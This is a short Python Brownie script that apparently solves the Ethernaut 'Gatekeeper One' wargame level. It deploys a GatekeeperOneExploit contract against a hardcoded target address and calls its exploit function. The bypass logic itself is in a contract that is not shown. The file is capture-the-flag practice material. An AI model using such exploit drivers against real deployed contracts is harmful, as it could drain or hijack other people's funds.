from brownie import GatekeeperOne,GatekeeperOneExploit, config,accounts,web3

#input the contract address
#> contract.address
contractAddress = '0xFBdEf6955E1aC42E12a4f9694E8E6d85dE27EadB'
player = accounts.add(config["wallets"]["from_key"])

def solution():
    keeper = GatekeeperOne.at(contractAddress)
    exploit = GatekeeperOneExploit.deploy({"from":player})
    exploit.exploit(keeper.address,{"from":player})

    
def main():
    solution()